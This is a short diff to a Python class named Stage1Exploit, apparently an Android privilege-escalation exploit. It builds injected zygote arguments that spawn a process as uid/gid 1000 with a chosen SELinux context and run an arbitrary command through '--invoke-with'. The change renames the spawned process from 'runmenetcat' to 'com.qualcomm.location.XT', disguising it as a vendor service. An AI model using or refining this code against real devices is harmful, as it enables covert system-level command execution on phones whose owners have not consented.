@@ -189,11 +189,11 @@ class Stage1Exploit:
         raw_zygote_arguments = [
             "--setuid=1000",
             "--setgid=1000",
-            "--setgroups=1065,3003",
+            "--setgroups=3003",
             "--runtime-args",
-            "--seinfo=platform:isSystemServer:system_app:targetSdkVersion=28:complete",
+            "--seinfo=platform:isPrivApp:priv_app:targetSdkVersion=28:complete",
             "--runtime-flags=1",
-            "--nice-name=runmenetcat",
+            "--nice-name=com.qualcomm.location.XT",
             "--invoke-with",
             f"{command}#",
         ]
